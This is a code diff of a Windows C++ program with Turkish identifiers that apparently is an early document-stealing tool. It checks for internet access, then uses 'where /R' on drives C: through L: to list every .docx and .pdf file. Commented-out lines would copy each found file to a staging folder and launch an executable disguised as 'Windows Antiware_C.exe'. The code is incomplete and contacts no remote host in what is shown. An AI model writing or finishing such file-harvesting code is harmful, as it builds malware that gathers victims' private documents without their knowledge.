@@ -2,104 +2,86 @@
 #include <fstream>
 #include <string>
 #include <windows.h>
+#include <Windows.h>
 #include <winsock.h>
-#pragma comment(lib, "urlmon.lib")
 
 using namespace std;
 
 int internet_kontrol(){
-    system("ping www.google.com > bilgiler.txt");
+    system("ping www.google.com > logs.txt");
 
-    ifstream ping_dosya_acma("bilgiler.txt", ios::in);
+    ifstream ping_dosya_acici("logs.txt", ios::in);
 
-    if(ping_dosya_acma.is_open()){
+    if(ping_dosya_acici.is_open()){
 
         bool kelime_bulamama = true;
-        string ping_dosya_tasima;
+        string ping_dosya_tutucu;
 
-        while(getline(ping_dosya_acma, ping_dosya_tasima)){
+        while(getline(ping_dosya_acici, ping_dosya_tutucu)){
 
-            if(ping_dosya_tasima.find("TTL", 0) != string::npos){
-
-                cout << "Internet baglantisi tespit edildi.\n";
+            if(ping_dosya_tutucu.find("TTL", 0) != string::npos){
+            	
                 kelime_bulamama = false;
-                break;
+                return 1;
             }
         }
 
         if(kelime_bulamama == true){
 
-            cout << "Internet yok.\n";
+            return 0;
         }
     }
 
     else{
 
-        cout << "bilgiler.txt dosyasi acilamiyor.\n";
+        return 2;
     }
-    
-    return 0;
 }
 
-int Kontrol(){
-	INPUT in[2] = {};
-    ZeroMemory(in, sizeof(in));
+int Dosya_bulma(){
+	
+	system("where /R C: *.docx *.pdf > logs_2.txt");
+	system("where /R D: *.docx *.pdf >> logs_2.txt");
+	system("where /R E: *.docx *.pdf >> logs_2.txt");
+	system("where /R F: *.docx *.pdf >> logs_2.txt");
+	system("where /R G: *.docx *.pdf >> logs_2.txt");
+	system("where /R K: *.docx *.pdf >> logs_2.txt");
+	system("where /R L: *.docx *.pdf >> logs_2.txt");
+	
+	/*ifstream dosya_yol_acici("logs_2.txt", ios::in);
 
-    in[0].type = INPUT_KEYBOARD;
-    in[0].ki.wVk = 0x5B;
-    in[0].ki.dwFlags = KEYEVENTF_EXTENDEDKEY;
-    
-    in[1].type = INPUT_KEYBOARD;
-    in[1].ki.wVk = 0x5B;
-    in[1].ki.dwFlags = KEYEVENTF_KEYUP;
+    if(dosya_yol_acici.is_open()){
 
-    Sleep(1000);
+        string dosya_yol_tutucu;
+        string komut_string;
+        
+        while(getline(dosya_yol_acici, dosya_yol_tutucu)){
 
-    UINT uS = SendInput(2, in, sizeof(INPUT));
-
-    if(uS != 2){
-        cout << "HATA";
-    }
-    else{
-        cout << "TAMAMLANDI";
-    }
-    
-    return 0;
-}
-
-int soket_olusturma(){
-
-	/*int soket_olusturma(){
-    
-	SOCKET soket = socket(AF_INET, SOCK_STREAM, 0);
-	if(soket < 0){
-		printf("Soket olusturma sirasinda hata ile karsilasildi.");
+			komut_string = "xcopy " + dosya_yol_tutucu + " \Files /C /Y";
+            system(komut_string.c_str());
+        }
 	}
+	
 	else{
-		printf("Soket basariyla olusturuldu.");
-	}
-	return 0;
-}*/
-}
+		return 2;
+	}*/
 
-int kendini_tasima(){
-
-	/*system("REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ /v HideFileExt /t REG_DWORD /d 0 /f");
-	
-	/*system("where /R D: *.docx *.pdf")*/
-
-}
-
-int guncellestirme(){
-	
 }
 
 int main(){
 
-	internet_kontrol();
-	kendini_tasima();
+	if(internet_kontrol() == 1){
+		
+		/*system("Windows Antiware_C.exe");*/
+	}
 	
-	system("pause");
+	else{
+		
+		return 3;
+		
+	}
+	
+	Dosya_bulma();
 
     return 0;
 }
